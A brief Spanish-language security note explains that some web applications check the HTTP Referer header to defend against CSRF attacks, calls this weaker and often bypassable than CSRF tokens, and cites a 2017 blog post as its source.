Además de las defensas que emplean tokens CSRF, algunas aplicaciones utilizan el header `Referer` HTTP para intentar defenderse de los ataques CSRF, normalmente al verificar que la solicitud se originó en el propio dominio de la aplicación. Este enfoque es generalmente menos eficaz y, a menudo, está sujeto a desviaciones.

## FUENTE

- [https://igmoweb.com/2017/11/29/cross-site-request-forgery-dos-ejemplos-para-entenderlo/](https://igmoweb.com/2017/11/29/cross-site-request-forgery-dos-ejemplos-para-entenderlo/)
